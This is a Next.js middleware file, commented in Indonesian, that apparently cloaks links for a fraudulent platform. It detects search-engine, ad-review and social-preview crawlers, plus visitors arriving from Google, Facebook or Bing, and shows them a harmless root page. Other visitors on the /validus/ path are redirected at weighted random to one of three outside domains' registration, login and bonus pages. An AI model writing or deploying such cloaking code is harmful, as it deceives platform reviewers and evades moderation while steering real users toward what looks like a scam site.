import { NextResponse } from 'next/server';

// ===============================================
// 1. KONFIGURASI KHUSUS ANDA
// ===============================================

// JALUR UTAMA YANG MENGAKTIFKAN PENGALIHAN
const ACTIVE_REDIRECT_PATH = '/validus/'; 

// URL TARGET BERBOBOT (Weighted Targets)
const TARGET_URLS_WEIGHTED = [
    // [Domain Dasar, Bobot/Prioritas]
    ["https://ventureidven.com", 70],  
    ["https://akunfinansial.com", 20],   
    ["https://platformtugas.com", 10]    
];

// USER AGENT BOT/CRAWLER
const BOT_AGENTS = ["googlebot", "bingbot", "yahoo! slurp", "adsbot", "facebookexternalhit"];
const SUSPICIOUS_REFERERS = ["google.com", "facebook.com", "bing.com"];


// ===============================================
// FUNGSI UTAMA MIDDLEWARE
// ===============================================

export default function middleware(request) {
    const url = new URL(request.url);
    const pathname = url.pathname.toLowerCase();
    const userAgent = request.headers.get('user-agent')?.toLowerCase() || '';
    const referer = request.headers.get('referer')?.toLowerCase() || '';

    let isBot = false;
    // Pengecekan Bot (WhatsApp, Facebook, Google, dll. akan terdeteksi di sini)
    for (const bot of BOT_AGENTS) {
        if (userAgent.includes(bot)) { isBot = true; break; }
    }
    for (const ref of SUSPICIOUS_REFERERS) {
        if (referer.includes(ref)) { isBot = true; break; }
    }

    // Pengecekan Path
    const isCorrectBasePath = pathname.startsWith(ACTIVE_REDIRECT_PATH);

    // KONDISI 1: JALUR BENAR DAN BUKAN BOT (HUMAN)
    if (isCorrectBasePath && !isBot) {
        // ---- LOGIKA RANDOM BERBOBOT ----
        const totalWeight = TARGET_URLS_WEIGHTED.reduce((sum, item) => sum + item[1], 0);
        let randomValue = Math.random() * totalWeight;
        let randomBaseDomain = '';

        for (const [domain, weight] of TARGET_URLS_WEIGHTED) {
            randomValue -= weight;
            if (randomValue <= 0) {
                randomBaseDomain = domain;
                break;
            }
        }
        // ---------------------------------

        // 2. Ambil Sisa Path TEPAT setelah '/validus'
        let remainingPath = pathname.substring(ACTIVE_REDIRECT_PATH.length);

        // 3. Tentukan Path Tujuan Sebenarnya (Mapping)
        let targetPath = '/'; 

        if (remainingPath === 'daftar' || remainingPath === '/daftar') {
            targetPath = '/index/user/register';
        } else if (remainingPath === 'home' || remainingPath === '/home') {
            targetPath = '/index/my/index';
        } else if (remainingPath === 'login' || remainingPath === '/login') {
            targetPath = '/index/user/login';
        } 
        else if (remainingPath === 'bonus' || remainingPath === '/bonus') { 
            targetPath = '/index/promo/bonus'; 
        }
        else {
            targetPath = '/';
        } 
        
        // 4. Gabungkan Domain Dasar + Path Tujuan
        const finalRedirectUrl = randomBaseDomain + targetPath;

        // Lakukan Pengalihan 302
        return NextResponse.redirect(finalRedirectUrl, 302);
    } 
    
    // KONDISI 2: JALUR SALAH ATAU TERDETEKSI BOT/SCRAPER
    // Tampilkan Konten Aman (Rewrite ke root path)
    return NextResponse.rewrite(new URL('/', url)); 
}

// Konfigurasi agar Middleware berjalan di SEMUA PATH
export const config = {
    matcher: ['/:path*'],
};
